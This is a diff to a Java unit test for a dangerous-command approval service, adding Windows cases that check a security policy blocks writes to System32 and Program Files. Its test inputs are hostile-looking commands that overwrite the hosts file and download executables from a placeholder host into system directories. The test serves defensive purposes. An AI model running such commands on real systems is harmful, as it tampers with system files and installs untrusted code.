@@ -7147,6 +7147,15 @@ public class DangerousCommandApprovalServiceTest {
         SecurityPolicyService.FileVerdict localBin =
                 securityPolicyService.checkCommandPaths(
                         "curl https://example.invalid/payload -o /usr/local/bin/payload");
+        SecurityPolicyService.FileVerdict windowsSystem32 =
+                securityPolicyService.checkCommandPaths(
+                        "Set-Content C:\\Windows\\System32\\drivers\\etc\\hosts bad");
+        SecurityPolicyService.FileVerdict windirSystem32 =
+                securityPolicyService.checkCommandPaths(
+                        "Add-Content $env:windir\\System32\\drivers\\etc\\hosts bad");
+        SecurityPolicyService.FileVerdict programFiles =
+                securityPolicyService.checkCommandPaths(
+                        "Invoke-WebRequest https://example.invalid/app.exe -OutFile \"C:\\Program Files\\App\\app.exe\"");
         SecurityPolicyService.FileVerdict localDownload =
                 securityPolicyService.checkCommandPaths(
                         "curl https://example.invalid/payload -o payload");
@@ -7159,6 +7168,12 @@ public class DangerousCommandApprovalServiceTest {
         assertThat(systemd.isAllowed()).isFalse();
         assertThat(localBin.isAllowed()).isFalse();
         assertThat(localBin.getPath()).isEqualTo("/usr/local/bin/payload");
+        assertThat(windowsSystem32.isAllowed()).isFalse();
+        assertThat(windowsSystem32.getMessage()).contains("系统文件");
+        assertThat(windirSystem32.isAllowed()).isFalse();
+        assertThat(windirSystem32.getPath()).isEqualTo("$env:windir\\System32\\drivers\\etc\\hosts");
+        assertThat(programFiles.isAllowed()).isFalse();
+        assertThat(programFiles.getPath()).contains("Program Files");
         assertThat(localDownload.isAllowed()).isTrue();
     }
 
